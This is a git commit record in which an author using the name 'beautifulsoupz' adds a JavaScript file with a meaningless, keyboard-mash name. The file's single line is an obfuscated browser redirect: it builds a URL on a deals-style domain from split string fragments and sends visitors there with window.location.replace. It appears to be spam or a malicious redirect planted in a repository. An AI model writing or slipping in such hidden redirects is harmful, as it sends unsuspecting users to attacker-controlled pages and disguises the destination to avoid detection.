7fd1c26423cd06b3379901e405a198177fcc4902
beautifulsoupz <77855946+crossrevicerszedorton@users.noreply.github.com>
2022-12-29 20:31:10 +0100

    Create jhfwjfjwhvfhjwvjwhvjwhgfjqhgjfhgjhgwefjwgjfwjhfjhfhgfhg.js

---
+++ jhfwjfjwhvfhjwvjwhvjwhgfjqhgjfhgjhgwefjwgjfwjhfjhfhgfhg.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`https:`,`//www.d`,`etailonlinedeals.c`,`om/m7CEvk6aa`,`iZQ_Sh8Ki46Q`,`qEtZTu5JRxx`,`lhlk8hPVP`,`VUpXdxkKxk`,`mP2j2dw_6d`,`jGMI3MM`,`pYxWIs7t65`,`OvKE`,`D7rQ~~`))
